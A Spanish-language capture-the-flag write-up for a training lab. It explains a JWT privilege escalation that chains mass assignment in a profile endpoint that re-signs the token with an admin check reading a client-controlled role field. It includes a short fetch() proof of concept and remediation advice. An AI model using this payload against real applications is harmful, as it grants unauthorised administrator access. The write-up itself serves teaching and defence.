# Write-up: Hacking HackingDay (Reto 53)

## Objetivo del Ejercicio
El objetivo de este reto (categoría Tokens) es demostrar cómo la combinación de dos vulnerabilidades en el manejo de sesiones basadas en JSON Web Tokens (JWT) puede llevar a una escalada de privilegios total (Account Takeover / Privilege Escalation), permitiendo acceder a rutas restringidas (como `/admin`). Todo esto en un entorno de laboratorio diseñado para fines formativos.

## Análisis de la Vulnerabilidad (Causa Raíz)
La aplicación almacena el estado de la sesión del usuario en una cookie que contiene un JWT (`session`). Al decodificar el payload del JWT de un usuario común (rol `attendee`), observamos la siguiente estructura de datos separada:

```json
{
  "system_data": {
    "user_id": 18,
    "user_role": "attendee"
  },
  "user_data": {
    "name": "test",
    "phone": "1212121"
  },
  "exp": 1791487264
}
```

La vulnerabilidad reside en la combinación de dos fallas críticas en el backend:

1. **Mass Assignment (Asignación Masiva):** En el endpoint de actualización de perfil (`POST /api/perfil`), el servidor toma el cuerpo de la petición JSON y lo inyecta directamente dentro del objeto `user_data` sin una lista blanca (whitelist) de campos permitidos. Adicionalmente, el servidor **re-firma** este JWT modificado y lo establece como la nueva cookie válida.
2. **Confusión de Contexto Lógico (Lógica de Acceso Rota):** El panel de administración en `/admin` valida correctamente la firma criptográfica del JWT, pero extrae el rol del usuario desde `user_data.user_role` en lugar de la fuente autoritativa de confianza `system_data.user_role`.

Debido a que el servidor acepta generar tokens firmados con parámetros introducidos por el usuario, un atacante no necesita crackear el secreto HMAC ni buscar una vulnerabilidad criptográfica (como `alg: none`), ya que el mismo servidor se encarga de proveer un JWT perfectamente firmado.

## Prueba de Concepto (PoC)

1. Autenticarse en la plataforma y dirigirse a la vista del perfil de usuario (`/perfil`).
2. Interceptar la petición de guardado o ejecutar la actualización desde la consola de desarrollo (F12) inyectando el campo `user_role`:

```javascript
fetch('/api/perfil', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    name: "test",
    phone: "1212121",
    user_role: "admin"
  })
});
```

3. El servidor recibe esta carga útil, la acopla dentro de `user_data` y genera un nuevo JWT con firma válida:
```json
{
  "system_data": {
    "user_id": 18,
    "user_role": "attendee"
  },
  "user_data": {
    "name": "test",
    "phone": "1212121",
    "user_role": "admin"
  }
}
```
4. Al visitar la ruta restringida `/admin`, el validador de permisos lee equivocadamente `user_data.user_role` ("admin") y autoriza el acceso, revelando la lista completa de inscriptos y la flag (`ad440bb573835abcd8a9be26acc749d3`).

## Remediación y Defensa (Enfoque OWASP)
Para reparar definitivamente este comportamiento, el equipo de desarrollo debe implementar las siguientes medidas defensivas:

1. **Control de Autorización Centralizado:** El rol del usuario jamás debe derivarse de campos que puedan ser controlados o alterados por la entrada del cliente. Debe leerse siempre de los *claims* protegidos (`system_data.user_role`) o re-consultarse a nivel de servidor contra la base de datos en peticiones sensibles.
2. **Filtrado de Entrada (Allow-listing):** Al procesar actualizaciones (como `/api/perfil`), se debe extraer exclusivamente los campos esperados (`name`, `phone`) del cuerpo HTTP. Nunca hacer un "volcado" completo (merge) del cuerpo JSON dentro de las estructuras de la sesión (previniendo el Mass Assignment).
3. **Reducción de Superficie en JWT:** Evitar acoplar "datos de perfil" junto con "datos de autorización" en el mismo token. El JWT debería contener únicamente el identificador esencial (ej. `user_id` y `role`) minimizando los vectores de inyección.
